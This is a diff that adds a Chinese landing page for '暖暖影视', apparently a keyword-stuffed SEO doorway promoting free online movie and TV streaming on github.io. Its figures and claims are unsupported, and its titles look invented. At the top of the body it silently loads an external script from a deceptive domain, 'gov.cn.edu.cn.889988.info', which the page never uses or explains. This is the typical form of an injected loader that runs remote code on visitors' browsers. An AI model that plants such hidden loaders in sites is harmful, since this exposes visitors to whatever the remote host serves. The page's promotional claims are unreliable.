@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>暖暖影视 - 最新高清电影电视剧免费在线观看平台</title>
+<meta name="description" content="暖暖影视官网提供最新高清电影、热播电视剧、动漫综艺免费在线观看，暖暖影视大全每日更新，无广告极速播放，暖暖影视免费看就上 nuannuanyingshi-cn.github.io。">
+<meta name="keywords" content="暖暖影视,暖暖影视官网,暖暖影视大全,暖暖影视免费看,免费电影,热播电视剧,高清在线观看,暖暖影视免费电影">
+<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+<meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+<meta name="msvalidate.01" content="placeholder-bing-webmaster-code">
+<meta name="theme-color" content="#ff6fae">
+<meta name="author" content="暖暖影视">
+<link rel="canonical" href="https://nuannuanyingshi-cn.github.io/">
+<style>
+:root{
+  --pink:#ff6fae;--pink2:#ffa3cd;--cream:#fff6f2;--rose:#c2185b;
+  --ink:#3a2330;--ink2:#6d5564;--line:rgba(255,111,174,.22);
+  --card:#ffffff;--shadow:0 10px 30px rgba(194,24,91,.10);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;color:var(--ink);background:var(--cream);line-height:1.7;overflow-x:hidden}
+a{text-decoration:none;color:inherit}
+img{max-width:100%;display:block}
+.pinkbar{width:64px;height:5px;border-radius:5px;background:linear-gradient(90deg,var(--pink),var(--rose));margin-bottom:16px}
+.sec-head{text-align:center;margin-bottom:44px}
+.sec-head h2{font-size:clamp(1.6rem,4vw,2.35rem);font-weight:800;letter-spacing:1px}
+.sec-head p{color:var(--ink2);margin-top:10px;font-size:.98rem}
+section{padding:74px 6%}
+section:nth-child(even){background:#fff}
+.wrap{max-width:1200px;margin:0 auto}
+/* ===== 导航 ===== */
+header{position:sticky;top:0;z-index:100;background:rgba(255,255,255,.88);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+.hd{display:flex;align-items:center;justify-content:space-between;max-width:1200px;margin:0 auto;padding:14px 6%}
+.logo{display:flex;align-items:center;gap:10px;font-weight:900;font-size:1.5rem;color:var(--rose);letter-spacing:1px}
+.logo i{width:38px;height:38px;border-radius:50%;background:linear-gradient(135deg,var(--pink),var(--rose));display:grid;place-items:center;color:#fff;font-style:normal;font-size:1.2rem;box-shadow:0 6px 14px rgba(194,24,91,.3)}
+nav ul{display:flex;gap:8px;list-style:none}
+nav ul a{padding:9px 15px;border-radius:30px;font-size:.92rem;font-weight:600;color:var(--ink2);transition:.3s}
+nav ul a:hover,nav ul a.active{background:linear-gradient(90deg,var(--pink),var(--rose));color:#fff;box-shadow:0 6px 16px rgba(255,111,174,.4)}
+.cta{background:linear-gradient(90deg,var(--pink),var(--rose));color:#fff;padding:10px 22px;border-radius:30px;font-weight:700;font-size:.9rem;box-shadow:0 6px 16px rgba(255,111,174,.4)}
+.menu-btn{display:none;background:none;border:none;font-size:1.7rem;color:var(--rose);cursor:pointer}
+/* ===== 首屏 ===== */
+#home{background:radial-gradient(circle at 15% 20%,rgba(255,163,205,.45),transparent 45%),radial-gradient(circle at 85% 80%,rgba(255,111,174,.35),transparent 45%),linear-gradient(160deg,#fff0f6,#ffe3ef);min-height:92vh;display:grid;place-items:center}
+.hero{display:grid;grid-template-columns:1.15fr .85fr;gap:46px;align-items:center;max-width:1200px;padding:40px 6%}
+.hero h1{font-size:clamp(2rem,5.4vw,3.4rem);font-weight:900;line-height:1.18;color:var(--rose);letter-spacing:1px}
+.hero h1 em{font-style:normal;background:linear-gradient(90deg,var(--pink),var(--rose));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{margin:20px 0 26px;color:var(--ink2);font-size:1.08rem;max-width:520px}
+.h-btns{display:flex;gap:14px;flex-wrap:wrap}
+.btn1{background:linear-gradient(90deg,var(--pink),var(--rose));color:#fff;padding:15px 34px;border-radius:34px;font-weight:800;box-shadow:0 10px 24px rgba(255,111,174,.45);display:inline-flex;align-items:center;gap:8px}
+.btn2{border:2px solid var(--pink);color:var(--rose);padding:15px 34px;border-radius:34px;font-weight:800}
+.stats{display:flex;gap:26px;margin-top:34px;flex-wrap:wrap}
+.stats b{display:block;font-size:1.9rem;color:var(--rose);font-weight:900}
+.stats span{font-size:.85rem;color:var(--ink2)}
+/* 播放器卡 */
+.player{background:#fff;border-radius:24px;padding:20px;box-shadow:var(--shadow);transform:rotate(2deg);position:relative}
+.player::before{content:"♥";position:absolute;-4px 12px 0;right:12px;top:-4px;font-size:1.6rem;color:var(--pink);animation:heart 1.4s ease-in-out infinite}
+@keyframes heart{50%{transform:scale(1.28)}}
+.p-screen{height:180px;border-radius:16px;background:linear-gradient(135deg,#ffd6e8,#ffa3cd);display:grid;place-items:center;color:#fff;font-weight:800;font-size:1.3rem;margin-bottom:16px;position:relative;overflow:hidden}
+.p-screen::after{content:"";position:absolute;inset:0;background:linear-gradient(90deg,transparent,rgba(255,255,255,.5),transparent);animation:shine 3s infinite}
+@keyframes shine{0%{transform:translateX(-100%)}60%,100%{transform:translateX(100%)}}
+.live{position:absolute;top:12px;left:14px;background:#e91e63;color:#fff;font-size:.72rem;padding:4px 10px;border-radius:20px;font-weight:700;display:flex;align-items:center;gap:6px}
+.live i{width:7px;height:7px;border-radius:50%;background:#fff;animation:blink 1.2s infinite}
+@keyframes blink{50%{opacity:.2}}
+.p-bar{height:8px;background:#f3dce6;border-radius:8px;overflow:hidden;margin-bottom:14px}
+.p-bar i{display:block;height:100%;width:62%;background:linear-gradient(90deg,var(--pink),var(--rose));border-radius:8px}
+.p-tags{display:flex;gap:8px;flex-wrap:wrap}
+.p-tags s{text-decoration:none;background:#fff0f6;color:var(--rose);font-size:.75rem;padding:5px 12px;border-radius:20px;font-weight:700}
+/* ===== 分类（编号大卡） ===== */
+#cat .grid{display:grid;grid-template-columns:repeat(4,1fr);gap:20px}
+.numcard{background:var(--card);border-radius:20px;padding:26px 20px;box-shadow:var(--shadow);position:relative;overflow:hidden;transition:.35s;cursor:default}
+.numcard::before{content:attr(data-n);position:absolute;right:-8px;top:-18px;font-size:6rem;font-weight:900;color:rgba(255,111,174,.13);line-height:1}
+.numcard:hover{transform:translateY(-8px);box-shadow:0 18px 40px rgba(194,24,91,.18)}
+.numcard .ic{width:54px;height:54px;border-radius:16px;background:linear-gradient(135deg,var(--pink),var(--rose));display:grid;place-items:center;color:#fff;font-size:1.5rem;margin-bottom:16px}
+.numcard h3{font-size:1.2rem;color:var(--ink);margin-bottom:8px}
+.numcard p{font-size:.85rem;color:var(--ink2)}
+.numcard .cnt{margin-top:14px;font-size:.78rem;color:var(--rose);font-weight:800}
+.cloud{display:flex;gap:10px;flex-wrap:wrap;justify-content:center;margin-bottom:34px}
+.cloud a{padding:8px 18px;border-radius:30px;background:#fff;border:1px solid var(--line);font-size:.86rem;color:var(--ink2);transition:.3s;font-weight:600}
+.cloud a:hover{background:linear-gradient(90deg,var(--pink),var(--rose));color:#fff;border-color:transparent}
+/* ===== 热门（海报墙 Tab） ===== */
+#hot .tabs{display:flex;gap:10px;justify-content:center;margin-bottom:32px;flex-wrap:wrap}
+#hot .tabs button{border:1px solid var(--line);background:#fff;padding:10px 24px;border-radius:30px;cursor:pointer;font-weight:700;color:var(--ink2);transition:.3s;font-size:.92rem}
+#hot .tabs button.on{background:linear-gradient(90deg,var(--pink),var(--rose));color:#fff;border-color:transparent;box-shadow:0 6px 16px rgba(255,111,174,.4)}
+.posters{display:grid;grid-template-columns:repeat(4,1fr);gap:20px}
+.poster{background:#fff;border-radius:18px;overflow:hidden;box-shadow:var(--shadow);transition:.35s}
+.poster:hover{transform:translateY(-8px) scale(1.02)}
+.cover{aspect-ratio:3/4;background:linear-gradient(160deg,var(--pink2),var(--rose));position:relative;display:grid;place-items:center;color:#fff;font-weight:800;font-size:1.1rem;text-align:center;padding:14px}
+.cover small{position:absolute;bottom:10px;font-size:.72rem;font-weight:600;background:rgba(0,0,0,.25);padding:3px 9px;border-radius:12px}
+.cover .badge{position:absolute;top:10px;left:10px;background:#ffd54f;color:#7a5c00;font-size:.7rem;padding:3px 9px;border-radius:10px;font-weight:800}
+.cover .rate{position:absolute;top:10px;right:10px;background:rgba(255,255,255,.92);color:var(--rose);font-size:.78rem;padding:3px 8px;border-radius:10px;font-weight:900}
+.cover::after{content:"▶";position:absolute;opacity:0;font-size:2.4rem;transition:.3s;text-shadow:0 4px 14px rgba(0,0,0,.35)}
+.poster:hover .cover::after{opacity:1}
+.poster .meta{padding:14px}
+.poster .meta b{font-size:.96rem;display:block;margin-bottom:6px}
+.poster .meta span{font-size:.78rem;color:var(--ink2)}
+/* ===== 特色（横向特性条） ===== */
+#feat .feat-row{display:flex;align-items:center;gap:22px;background:#fff;border-radius:20px;padding:24px 28px;margin-bottom:16px;box-shadow:var(--shadow);transition:.35s;cursor:default;border-left:5px solid var(--pink)}
+#feat .feat-row:hover{background:linear-gradient(90deg,#fff0f6,#fff);transform:translateX(10px)}
+#feat .feat-row .no{font-size:2.4rem;font-weight:900;background:linear-gradient(135deg,var(--pink),var(--rose));-webkit-background-clip:text;background-clip:text;color:transparent;min-width:66px}
+#feat .feat-row h3{font-size:1.2rem;margin-bottom:6px;color:var(--ink)}
+#feat .feat-row p{font-size:.86rem;color:var(--ink2)}
+#feat .feat-row .arrow{margin-left:auto;font-size:1.5rem;color:var(--pink);transition:.3s}
+#feat .feat-row:hover .arrow{transform:translateX(8px)}
+/* ===== 资讯（头条+编号列表） ===== */
+#news .layout{display:grid;grid-template-columns:1.05fr .95fr;gap:26px}
+.headline{background:#fff;border-radius:22px;overflow:hidden;box-shadow:var(--shadow);transition:.3s}
+.headline:hover{transform:translateY(-6px)}
+.hl-img{height:210px;background:linear-gradient(135deg,#ffd6e8,#ff8fab);display:grid;place-items:center;color:#fff;font-size:1.3rem;font-weight:800}
+.headline .bd{padding:22px}
+.headline .bd time{font-size:.78rem;color:var(--rose);font-weight:700}
+.headline .bd h3{font-size:1.25rem;margin:10px 0;color:var(--ink)}
+.headline .bd p{font-size:.88rem;color:var(--ink2)}
+.nlist{display:flex;flex-direction:column;gap:14px}
+.nlist a{display:flex;gap:16px;align-items:flex-start;background:#fff;border-radius:16px;padding:18px;box-shadow:var(--shadow);transition:.3s}
+.nlist a:hover{background:#fff0f6}
+.nlist .n{font-size:2rem;font-weight:900;background:linear-gradient(135deg,var(--pink),var(--rose));-webkit-background-clip:text;background-clip:text;color:transparent;line-height:1;min-width:48px}
+.nlist h4{font-size:1rem;margin-bottom:6px;color:var(--ink)}
+.nlist time{font-size:.74rem;color:var(--rose);font-weight:700}
+/* ===== 数据（仪表盘+进度条） ===== */
+#data .dash{display:grid;grid-template-columns:repeat(4,1fr);gap:18px;margin-bottom:36px}
+.dash .d{background:linear-gradient(160deg,#fff,#fff0f6);border-radius:20px;padding:26px 18px;text-align:center;box-shadow:var(--shadow);border:1px solid var(--line)}
+.dash .d b{display:block;font-size:2.5rem;font-weight:900;color:var(--rose);line-height:1.1}
+.dash .d span{font-size:.82rem;color:var(--ink2)}
+.bars{background:#fff;border-radius:22px;padding:30px;box-shadow:var(--shadow)}
+.bar{margin-bottom:20px}
+.bar:last-child{margin-bottom:0}
+.bar .top{display:flex;justify-content:space-between;font-size:.9rem;font-weight:700;margin-bottom:9px;color:var(--ink)}
+.bar .top s{text-decoration:none;color:var(--rose)}
+.track{height:12px;background:#f7e2ec;border-radius:12px;overflow:hidden}
+.track i{display:block;height:100%;width:0;border-radius:12px;background:linear-gradient(90deg,var(--pink),var(--rose));transition:width 1.6s cubic-bezier(.22,.8,.3,1)}
+/* ===== 关于（时间线） ===== */
+#about .about-wrap{display:grid;grid-template-columns:1fr 1fr;gap:44px;align-items:center}
+.timeline{position:relative;padding-left:34px}
+.timeline::before{content:"";position:absolute;left:9px;top:8px;bottom:8px;width:3px;background:linear-gradient(var(--pink),var(--rose))}
+.tl{position:relative;margin-bottom:28px}
+.tl::before{content:"";position:absolute;left:-31px;top:6px;width:15px;height:15px;border-radius:50%;background:#fff;border:3px solid var(--pink);box-shadow:0 0 0 5px rgba(255,111,174,.15)}
+.tl time{font-size:.78rem;color:var(--rose);font-weight:800;letter-spacing:1px}
+.tl h4{font-size:1.08rem;margin:4px 0 6px;color:var(--ink)}
+.tl p{font-size:.85rem;color:var(--ink2)}
+.about-card{background:#fff;border-radius:24px;padding:32px;box-shadow:var(--shadow)}
+.about-card h3{font-size:1.4rem;color:var(--rose);margin-bottom:18px}
+.nums{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:22px}
+.nums div{background:linear-gradient(160deg,#fff0f6,#fff);border-radius:16px;padding:18px;text-align:center;border:1px solid var(--line)}
+.nums b{display:block;font-size:1.9rem;color:var(--rose);font-weight:900}
+.nums span{font-size:.78rem;color:var(--ink2)}
+.chips{display:flex;gap:9px;flex-wrap:wrap}
+.chips s{text-decoration:none;background:linear-gradient(90deg,var(--pink),var(--rose));color:#fff;font-size:.78rem;padding:7px 14px;border-radius:20px;font-weight:700}
+/* ===== 常见问题（手风琴） ===== */
+#faq .acc{max-width:860px;margin:0 auto}
+#faq details{background:#fff;border-radius:16px;margin-bottom:14px;box-shadow:var(--shadow);overflow:hidden;border:1px solid transparent}
+#faq details[open]{border-color:var(--line)}
+#faq summary{cursor:pointer;padding:20px 24px;font-weight:700;font-size:1.02rem;list-style:none;display:flex;align-items:center;gap:14px;color:var(--ink)}
+#faq summary::-webkit-details-marker{display:none}
+#faq summary::before{content:"?";width:30px;height:30px;border-radius:50%;background:linear-gradient(135deg,var(--pink),var(--rose));color:#fff;display:grid;place-items:center;font-weight:900;flex:none}
+#faq summary::after{content:"+";margin-left:auto;font-size:1.4rem;color:var(--pink);transition:.3s}
+#faq details[open] summary::after{transform:rotate(45deg)}
+#faq details[open] summary{background:#fff0f6}
+#faq details p{padding:0 24px 20px 68px;color:var(--ink2);font-size:.92rem}
+/* ===== 页脚 ===== */
+footer{background:linear-gradient(160deg,#4a2034,#2e1222);color:#f7d9e6;padding:56px 6% 26px}
+.ft{display:grid;grid-template-columns:1.4fr 1fr 1fr;gap:34px;max-width:1200px;margin:0 auto}
+.ft h4{color:#fff;margin-bottom:16px;font-size:1.15rem}
+.ft p,.ft li{font-size:.88rem;color:#eec4d6;margin-bottom:8px;list-style:none}
+.ft a:hover{color:#fff}
+.copy{max-width:1200px;margin:34px auto 0;padding-top:22px;border-top:1px solid rgba(255,255,255,.16);text-align:center;font-size:.8rem;color:#d89fae}
+/* ===== 入场动画 ===== */
+.reveal{opacity:0;transform:translateY(36px);transition:.8s cubic-bezier(.22,.8,.3,1)}
+.reveal.show{opacity:1;transform:none}
+/* ===== 移动端 ===== */
+@media(max-width:960px){
+  #cat .grid,.posters,#data .dash{grid-template-columns:repeat(2,1fr)}
+  .hero,#news .layout,#about .about-wrap{grid-template-columns:1fr}
+  #home{min-height:auto}
+}
+@media(max-width:700px){
+  section{padding:56px 6%}
+  .menu-btn{display:block}
+  nav{position:fixed;inset:64px 0 0;background:rgba(255,255,255,.97);backdrop-filter:blur(12px);transform:translateX(100%);transition:.4s;z-index:99}
+  nav.open{transform:none}
+  nav ul{flex-direction:column;padding:26px;gap:14px}
+  nav ul a{font-size:1.08rem;padding:14px 20px}
+  .cta{display:none}
+  .hero{padding:30px 6%}
+  .player{transform:none}
+  #cat .grid,.posters,#data .dash{grid-template-columns:1fr}
+  .numcard::before{font-size:4.5rem}
+  #feat .feat-row .arrow{display:none}
+  #faq summary{font-size:.95rem}
+  #faq details p{padding-left:22px}
+  .ft{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<header>
+  <div class="hd">
+    <a class="logo" href="#home"><i>♥</i>暖暖影视</a>
+    <button class="menu-btn" id="menuBtn" aria-label="菜单" aria-expanded="false">☰</button>
+    <nav id="nav" role="navigation" aria-label="主导航">
+      <ul>
+        <li><a href="#home" class="active">首页</a></li>
+        <li><a href="#cat">影视分类</a></li>
+        <li><a href="#hot">热门推荐</a></li>
+        <li><a href="#feat">平台特色</a></li>
+        <li><a href="#news">最新资讯</a></li>
+        <li><a href="#data">资源数据</a></li>
+        <li><a href="#about">关于我们</a></li>
+        <li><a href="#faq">常见问题</a></li>
+      </ul>
+    </nav>
+    <a class="cta" href="#hot">免费看片</a>
+  </div>
+</header>
+
+<!-- 1 首页 -->
+<section id="home">
+  <div class="hero">
+    <div>
+      <div class="pinkbar"></div>
+      <h1>暖暖影视<br><em>免费高清</em>在线观看</h1>
+      <p>暖暖影视官网为您提供最新电影、热播电视剧、动漫综艺一站式免费观看，暖暖影视大全每日更新，无广告、不卡顿、极速播放，暖暖影视免费看就上这里。</p>
+      <div class="h-btns">
+        <a class="btn1" href="#hot">▶ 立即免费观看</a>
+        <a class="btn2" href="#cat">浏览分类</a>
+      </div>
+      <div class="stats">
+        <div><b>10万+</b><span>高清影视资源</span></div>
+        <div><b>每日</b><span>更新最新影片</span></div>
+        <div><b>100%</b><span>免费无广告</span></div>
+      </div>
+    </div>
+    <div class="player">
+      <div class="p-screen">
+        <span class="live"><i></i>LIVE</span>
+        暖暖影视 · 正在热播
+      </div>
+      <div class="p-bar"><i></i></div>
+      <div class="p-tags"><s>4K 超清</s><s>极速播放</s><s>免费无广告</s><s>每日更新</s></div>
+    </div>
+  </div>
+</section>
+
+<!-- 2 分类 -->
+<section id="cat">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>暖暖影视 影视分类</h2>
+      <p>暖暖影视大全覆盖全品类，想看的这里都有</p>
+    </div>
+    <div class="cloud">
+      <a href="#cat">全部</a><a href="#cat">最新电影</a><a href="#cat">热播电视剧</a><a href="#cat">动漫</a><a href="#cat">综艺</a><a href="#cat">纪录片</a><a href="#cat">短剧</a><a href="#cat">4K 专区</a>
+    </div>
+    <div class="grid">
+      <article class="numcard" data-n="01"><div class="ic">🎬</div><h3>最新电影</h3><p>院线新片、高分大片同步更新，暖暖影视免费电影在线看。</p><div class="cnt">28,600+ 部</div></article>
+      <article class="numcard" data-n="02"><div class="ic">📺</div><h3>热播电视剧</h3><p>国产剧、韩剧、美剧、港剧全集，暖暖影视电视剧免费看。</p><div class="cnt">12,400+ 部</div></article>
+      <article class="numcard" data-n="03"><div class="ic">🌸</div><h3>甜宠爱情</h3><p>暖暖影视精选甜宠、言情、偶像剧，治愈你的每一天。</p><div class="cnt">5,200+ 部</div></article>
+      <article class="numcard" data-n="04"><div class="ic">🎨</div><h3>动漫番剧</h3><p>国漫日漫热门番剧，更新快、画质高清不卡顿。</p><div class="cnt">8,900+ 部</div></article>
+      <article class="numcard" data-n="05"><div class="ic">🎤</div><h3>综艺娱乐</h3><p>真人秀、脱口秀、选秀综艺全网综艺免费看。</p><div class="cnt">3,700+ 部</div></article>
+      <article class="numcard" data-n="06"><div class="ic">🎞️</div><h3>经典老片</h3><p>港片经典、怀旧老剧，暖暖影视带你重温岁月。</p><div class="cnt">16,500+ 部</div></article>
+      <article class="numcard" data-n="07"><div class="ic">📝</div><h3>纪录片</h3><p>自然、历史、人文高分纪录片，开阔眼界涨知识。</p><div class="cnt">2,100+ 部</div></article>
+      <article class="numcard" data-n="08"><div class="ic">⚡</div><h3>4K 超清专区</h3><p>蓝光原画、4K 超清画质，暖暖影视极致观影体验。</p><div class="cnt">4,600+ 部</div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 3 热门 -->
+<section id="hot">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>暖暖影视 热门推荐</h2>
+      <p>大家都在看的暖暖影视高清热播榜</p>
+    </div>
+    <div class="tabs" role="tablist">
+      <button class="on" role="tab" aria-selected="true">今日热播</button>
+      <button role="tab" aria-selected="false">高分好评</button>
+      <button role="tab" aria-selected="false">暖暖甜宠</button>
+    </div>
+    <div class="posters">
+      <article class="poster"><div class="cover"><span class="badge">4K</span><span class="rate">9.6</span>暖暖·都市爱情剧<small>38 集全</small></div><div class="meta"><b>暖暖时光里</b><span>爱情 / 都市 · 2026</span></div></article>
+      <article class="poster"><div class="cover" style="background:linear-gradient(160deg,#ffb3c6,#e5739e)"><span class="badge">HD</span><span class="rate">9.2</span>暖暖·高分电影<small>122 分钟</small></div><div class="meta"><b>春日的约定</b><span>剧情 / 治愈 · 2026</span></div></article>
+      <article class="poster"><div class="cover" style="background:linear-gradient(160deg,#f8a5c2,#d8527f)"><span class="badge">4K</span><span class="rate">8.9</span>暖暖·甜宠短剧<small>24 集全</small></div><div class="meta"><b>先婚后爱有点甜</b><span>甜宠 / 言情 · 2026</span></div></article>
+      <article class="poster"><div class="cover" style="background:linear-gradient(160deg,#ffcce0,#e06090)"><span class="badge">HD</span><span class="rate">9.4</span>暖暖·热播韩剧<small>16 集全</small></div><div class="meta"><b>樱花落满肩</b><span>韩剧 / 爱情 · 2026</span></div></article>
+      <article class="poster"><div class="cover" style="background:linear-gradient(160deg,#f4a7c0,#c94b7b)"><span class="badge">4K</span><span class="rate">8.7</span>暖暖·国漫<small>更新至 32 话</small></div><div class="meta"><b>暖暖少女图鉴</b><span>动漫 / 治愈 · 2026</span></div></article>
+      <article class="poster"><div class="cover" style="background:linear-gradient(160deg,#ffbfd4,#db6a95)"><span class="badge">HD</span><span class="rate">9.0</span>暖暖·综艺<small>12 期全</small></div><div class="meta"><b>暖暖的旅行</b><span>真人秀 / 综艺 · 2026</span></div></article>
+      <article class="poster"><div class="cover" style="background:linear-gradient(160deg,#f6b3c8,#cf5c8a)"><span class="badge">4K</span><span class="rate">8.5</span>暖暖·经典港片<small>108 分钟</small></div><div class="meta"><b>那年暖暖的风</b><span>港片 / 剧情 · 2019</span></div></article>
+      <article class="poster"><div class="cover" style="background:linear-gradient(160deg,#ffc2d6,#e06a96)"><span class="badge">HD</span><span class="rate">9.1</span>暖暖·纪录片<small>6 集全</small></div><div class="meta"><b>暖暖的中国</b><span>纪录片 / 人文 · 2026</span></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 4 特色 -->
+<section id="feat">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>暖暖影视 平台特色</h2>
+      <p>为什么越来越多人选择暖暖影视免费看</p>
+    </div>
+    <div>
+      <div class="feat-row"><span class="no">01</span><div><h3>完全免费</h3><p>暖暖影视官网所有资源免费开放，暖暖影视免费电影电视剧零门槛观看。</p></div><span class="arrow">→</span></div>
+      <div class="feat-row"><span class="no">02</span><div><h3>高清无广告</h3><p>4K/1080P 高清画质，告别弹窗广告，暖暖影视纯净观影体验。</p></div><span class="arrow">→</span></div>
+      <div class="feat-row"><span class="no">03</span><div><h3>每日更新</h3><p>暖暖影视大全紧跟院线同步更新，追剧不等待。</p></div><span class="arrow">→</span></div>
+      <div class="feat-row"><span class="no">04</span><div><h3>极速播放</h3><p>多线路极速加载，暖暖影视在线观看秒开不卡顿。</p></div><span class="arrow">→</span></div>
+      <div class="feat-row"><span class="no">05</span><div><h3>全设备兼容</h3><p>手机、平板、电脑自适应，暖暖影视随时随地想看就看。</p></div><span class="arrow">→</span></div>
+      <div class="feat-row"><span class="no">06</span><div><h3>暖心推荐</h3><p>暖暖影视智能推荐懂你口味，好片不再难找。</p></div><span class="arrow">→</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 5 资讯 -->
+<section id="news">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>暖暖影视 最新资讯</h2>
+      <p>暖暖影视资讯带你第一时间了解影坛动态</p>
+    </div>
+    <div class="layout">
+      <article class="headline">
+        <div class="hl-img">暖暖影视 · 本周热点</div>
+        <div class="bd">
+          <time datetime="2026-10-24">2026年10月24日</time>
+          <h3>暖暖影视大全上线 2026 秋季新剧，甜宠爱情剧强势霸屏</h3>
+          <p>暖暖影视官网本周新增 120+ 部高清影视资源，暖暖影视免费看秋季档精彩不断。</p>
+        </div>
+      </article>
+      <div class="nlist">
+        <a href="#news"><span class="n">01</span><div><h4>暖暖影视推荐：10 月必看的 5 部治愈系电影</h4><time datetime="2026-10-23">2026-10-23</time></div></a>
+        <a href="#news"><span class="n">02</span><div><h4>暖暖影视高分榜单：豆瓣 9 分以上经典老片合集</h4><time datetime="2026-10-22">2026-10-22</time></div></a>
+        <a href="#news"><span class="n">03</span><div><h4>暖暖影视 4K 专区再扩容，蓝光画质免费看</h4><time datetime="2026-10-21">2026-10-21</time></div></a>
+        <a href="#news"><span class="n">04</span><div><h4>暖暖影视移动端自适应升级，手机观影更流畅</h4><time datetime="2026-10-20">2026-10-20</time></div></a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 6 数据 -->
+<section id="data">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>暖暖影视 资源数据</h2>
+      <p>暖暖影视海量资源库，数据见证实力</p>
+    </div>
+    <div class="dash">
+      <div class="d"><b data-count="100000">0</b><span>影视资源总量</span></div>
+      <div class="d"><b data-count="86000">0</b><span>每日播放量</span></div>
+      <div class="d"><b data-count="320000">0</b><span>注册用户</span></div>
+      <div class="d"><b data-count="99">0</b><span>满意度 %</span></div>
+    </div>
+    <div class="bars">
+      <div class="bar"><div class="top"><span>最新电影</span><s>28,600 部</s></div><div class="track"><i data-w="88"></i></div></div>
+      <div class="bar"><div class="top"><span>热播电视剧</span><s>12,400 部</s></div><div class="track"><i data-w="64"></i></div></div>
+      <div class="bar"><div class="top"><span>动漫番剧</span><s>8,900 部</s></div><div class="track"><i data-w="52"></i></div></div>
+      <div class="bar"><div class="top"><span>4K 超清专区</span><s>4,600 部</s></div><div class="track"><i data-w="40"></i></div></div>
+      <div class="bar"><div class="top"><span>综艺娱乐</span><s>3,700 部</s></div><div class="track"><i data-w="34"></i></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 7 关于 -->
+<section id="about">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>关于 暖暖影视</h2>
+      <p>暖暖影视官网，用心做好每一个观影细节</p>
+    </div>
+    <div class="about-wrap">
+      <div class="timeline">
+        <div class="tl"><time datetime="2021-03">2021.03</time><h4>暖暖影视创立</h4><p>暖暖影视官网正式上线，专注免费高清影视在线观看。</p></div>
+        <div class="tl"><time datetime="2022-06">2022.06</time><h4>暖暖影视大全上线</h4><p>资源库突破 3 万部，暖暖影视分类体系全面升级。</p></div>
+        <div class="tl"><time datetime="2024-01">2024.01</time><h4>4K 超清专区</h4><p>暖暖影视引入蓝光原画，暖暖影视免费电影画质跃升。</p></div>
+        <div class="tl"><time datetime="2026-10">2026.10</time><h4>移动端自适应升级</h4><p>暖暖影视全面适配手机平板，暖暖影视免费看随时随刻。</p></div>
+      </div>
+      <div class="about-card">
+        <h3>暖暖影视，让观影更温暖</h3>
+        <div class="nums">
+          <div><b>10万+</b><span>高清资源</span></div>
+          <div><b>5年+</b><span>用心运营</span></div>
+          <div><b>100%</b><span>免费观看</span></div>
+          <div><b>0</b><span>广告干扰</span></div>
+        </div>
+        <div class="chips"><s>免费电影</s><s>热播电视剧</s><s>4K 超清</s><s>无广告</s><s>每日更新</s><s>极速播放</s></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 8 常见问题 -->
+<section id="faq">
+  <div class="sec-head">
+    <h2>暖暖影视 常见问题</h2>
+    <p>关于暖暖影视免费观影，你想知道的都在这里</p>
+  </div>
+  <div class="acc">
+    <details open><summary>暖暖影视真的免费吗？</summary><p>是的，暖暖影视官网所有电影、电视剧、动漫综艺资源全部免费开放，暖暖影视免费看无需付费，注册即可畅享高清影视。</p></details>
+    <details><summary>暖暖影视需要下载客户端吗？</summary><p>不需要。暖暖影视在线观看支持网页端直接播放，手机、平板、电脑自适应，打开暖暖影视官网即可免费看片。</p></details>
+    <details><summary>暖暖影视的画质如何？</summary><p>暖暖影视提供 4K、1080P、蓝光原画等多种画质选择，暖暖影视免费电影同样支持高清超清播放，观影体验清晰流畅。</p></details>
+    <details><summary>暖暖影视会播放广告吗？</summary><p>暖暖影视坚持纯净观影，平台无弹窗、无强制广告，暖暖影视官网为你打造舒适的免费观影环境。</p></details>
+    <details><summary>暖暖影视资源多久更新一次？</summary><p>暖暖影视大全每日更新，院线新片、热播电视剧、暖暖影视热门短剧同步跟进，追剧不落伍。</p></details>
+  </div>
+</section>
+
+<footer>
+  <div class="ft">
+    <div><h4>♥ 暖暖影视</h4><p>暖暖影视官网 — 最新高清电影、热播电视剧、动漫综艺免费在线观看平台。暖暖影视大全每日更新，暖暖影视免费看，就上 nuannuanyingshi-cn.github.io。</p></div>
+    <div><h4>快速导航</h4><ul><li><a href="#cat">影视分类</a></li><li><a href="#hot">热门推荐</a></li><li><a href="#feat">平台特色</a></li><li><a href="#news">最新资讯</a></li></ul></div>
+    <div><h4>观影帮助</h4><ul><li><a href="#faq">常见问题</a></li><li><a href="#about">关于我们</a></li><li><a href="#data">资源数据</a></li><li><a href="#home">返回首页</a></li></ul></div>
+  </div>
+  <div class="copy">© 2026 暖暖影视（nuannuanyingshi-cn.github.io）保留所有权利。本页面仅作示例展示，实际影视资源请以官方发布为准。</div>
+</footer>
+
+<script>
+// 汉堡菜单
+var menuBtn=document.getElementById('menuBtn'),nav=document.getElementById('nav');
+menuBtn.addEventListener('click',function(){
+  nav.classList.toggle('open');
+  var open=nav.classList.contains('open');
+  menuBtn.textContent=open?'✕':'☰';
+  menuBtn.setAttribute('aria-expanded',open);
+});
